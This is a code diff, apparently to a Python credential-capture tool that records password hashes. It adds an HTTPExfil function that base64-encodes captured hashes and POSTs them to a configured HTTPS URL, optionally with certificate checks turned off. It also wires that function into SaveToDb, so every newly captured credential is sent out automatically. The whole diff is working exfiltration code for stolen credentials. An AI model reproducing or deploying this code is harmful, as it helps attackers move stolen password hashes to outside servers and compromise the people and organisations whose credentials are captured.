@@ -26,6 +26,31 @@ import codecs
 import struct
 from calendar import timegm
 
+def HTTPExfil(result):
+    result = str(result)
+    try:
+        if not settings.Config.httpsexfil_enabled:
+            return
+        # requests isn't in stdlib, so using urllib
+        import urllib.parse 
+        import urllib.request
+        import ssl
+        import base64
+        ctx = ssl.create_default_context()
+        if not settings.Config.httpsexfil_verify:
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+
+        data = {
+            'hashes' : base64.b64encode(result.encode()),
+        }
+        data = bytes( urllib.parse.urlencode( data ).encode() )
+        handler = urllib.request.urlopen( settings.Config.httpsexfil_url, data , context=ctx)
+        print(color("[HTTPS Exfil]",3,1),"Sent via https exfil")
+    except Exception as e:
+        print(color("[HTTPS Exfil]",1),"Error sending via HTTPS Exfil{}".format(e))
+        return
+
 def EmailHash(result):
     import smtplib
     if not settings.Config.emailenabled:
@@ -311,6 +336,9 @@ def SaveToDb(result):
 
 		# Email to desired email address
 		EmailHash(str(result))
+
+		# Send via POST to HTTPS server
+		HTTPExfil(result)
         
 	elif len(result['cleartext']):
 		print(color('[*] Skipping previously captured cleartext password for %s' % result['user'], 3, 1))
